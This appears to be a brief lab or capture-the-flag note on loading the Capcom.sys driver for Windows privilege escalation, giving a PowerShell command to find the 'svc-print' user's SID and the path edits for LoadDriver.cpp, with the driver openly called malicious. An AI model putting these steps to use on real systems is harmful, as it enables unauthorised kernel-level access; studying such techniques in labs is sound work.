# Loading the driver

Check the SID of a current user.\
`Get-ADUser -Identity 'svc-print' | select SID`

Edit in the *LoadDriver.cpp* :

`PCWSTR pPathSource = L"C:\\Users\\svc-print\\Desktop\\Capcom.sys";`\
`PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";`

-------------------------------------------

**pPathSource** - path the the Capcom.sys malicious driver.\
**pPathSourceReg** - new service in the registry.
